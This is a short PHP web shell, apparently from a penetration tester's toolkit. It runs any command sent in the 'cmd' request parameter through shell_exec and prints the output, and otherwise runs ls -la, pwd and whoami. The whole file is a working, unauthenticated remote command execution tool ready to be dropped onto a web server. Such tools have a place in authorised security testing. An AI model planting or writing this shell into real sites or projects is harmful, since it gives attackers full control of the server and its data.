<?php
// simple php "shell": executes the commands in $cmd array or, if provided, in $_REQUEST['cmd']
// Frederic Mohr @ LastBreach, 2018

if (isset($_REQUEST['cmd'])){
  // in case setting a custom cmd value in the request works :)
  echo "<h1>executing custom command</h1>";
  echo "cmd: ".$_REQUEST['cmd'];
  $out=shell_exec($_REQUEST['cmd']);
  echo "<br>".$out;
} else {
  // otherwise, define your default commands here
  echo "<h1>executing default commands</h1>";
  $cmd = ["ls -la","pwd","whoami"];
  foreach($cmd as &$c){
    $out=shell_exec($c);
    echo "<br><br><b>".$c."</b><br>".$out;
  }
}

?>
